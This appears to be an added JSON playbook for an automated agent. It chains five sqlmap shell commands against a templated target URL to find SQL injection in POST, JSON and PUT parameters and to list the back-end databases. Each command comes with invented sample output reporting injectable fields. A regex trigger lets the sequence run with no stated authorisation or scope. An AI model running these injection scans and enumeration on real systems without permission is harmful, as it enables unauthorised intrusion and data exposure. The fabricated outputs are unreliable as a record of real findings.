@@ -1,0 +1,110 @@
+{
+  "name": "sqlmap_post_injection",
+  "description": "SQL injection testing on POST requests, forms, and JSON data using sqlmap",
+  "pattern": "sqlmap.*post|sql.*form.*inject|sqlmap.*data|post.*parameter.*inject",
+  "parameters": [
+    "target_url",
+    "post_data",
+    "method"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "sqlmap",
+        "args": [
+          "-u",
+          "{{target_url}}",
+          "--data",
+          "username=admin&password=test",
+          "--batch"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[15:50:10] [INFO] testing connection to the target URL\n[15:50:11] [INFO] testing if POST parameter 'username' is dynamic\n[15:50:12] [INFO] POST parameter 'username' appears to be dynamic\n[15:50:13] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable\n[15:50:15] [INFO] testing for SQL injection on POST parameter 'username'\n[15:50:20] [INFO] POST parameter 'username' is 'MySQL >= 5.0 AND error-based' injectable\n[15:50:25] [INFO] testing for SQL injection on POST parameter 'password'\n[15:50:30] [INFO] POST parameter 'password' appears to be not injectable\nPOST parameter 'username' vulnerable to SQL injection"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "sqlmap -u '{{target_url}}' --data='username=admin&password=test' -p username --batch --dbs"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[15:51:40] [INFO] resuming back-end DBMS 'mysql'\n[15:51:41] [INFO] testing connection to the target URL\n[15:51:42] [INFO] focusing on POST parameter 'username' only\n[15:51:45] [INFO] fetching database names\n[15:51:46] [INFO] retrieved: 'information_schema'\n[15:51:47] [INFO] retrieved: 'webapp_db'\n[15:51:48] [INFO] retrieved: 'users_database'\navailable databases [3]:\n[*] information_schema\n[*] users_database\n[*] webapp_db"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "sqlmap",
+        "args": [
+          "-u",
+          "{{target_url}}",
+          "--data",
+          "{\"username\":\"admin\",\"password\":\"test\"}",
+          "--headers",
+          "Content-Type: application/json",
+          "--batch"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[15:52:50] [INFO] testing connection to the target URL\n[15:52:51] [INFO] content-type identified as 'application/json'\n[15:52:52] [INFO] testing if JSON parameter 'username' is dynamic\n[15:52:53] [INFO] JSON parameter 'username' appears to be dynamic\n[15:52:55] [INFO] heuristic (basic) test shows that JSON parameter 'username' might be injectable\n[15:53:00] [INFO] JSON parameter 'username' is 'PostgreSQL > 8.1 AND time-based blind' injectable\nJSON injection point found in username field"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "sqlmap",
+        "args": [
+          "-r",
+          "request.txt",
+          "--batch",
+          "--risk=2",
+          "--level=3"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[15:54:10] [INFO] parsing HTTP request from 'request.txt'\n[15:54:11] [INFO] testing connection to the target URL\n[15:54:12] [INFO] found 3 injection points from request file:\n  - POST parameter 'email'\n  - POST parameter 'username'\n  - Cookie parameter 'session_id'\n[15:54:15] [INFO] testing POST parameter 'email'\n[15:54:20] [INFO] POST parameter 'email' is 'MySQL >= 5.0.12 AND time-based blind' injectable\n[15:54:25] [INFO] testing Cookie parameter 'session_id'\n[15:54:30] [INFO] Cookie parameter 'session_id' appears to be not injectable\nHTTP request file injection: 'email' parameter vulnerable"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "sqlmap -u '{{target_url}}' --data='search=test' --method=PUT --batch 2>&1 | grep -E 'testing|injectable'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[15:55:40] [INFO] testing connection to the target URL\n[15:55:41] [INFO] using HTTP method PUT\n[15:55:42] [INFO] testing if PUT parameter 'search' is dynamic\n[15:55:45] [INFO] testing for SQL injection on PUT parameter 'search'\n[15:55:50] [INFO] PUT parameter 'search' is 'MySQL >= 5.0 boolean-based blind' injectable\nPUT method injection successful"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
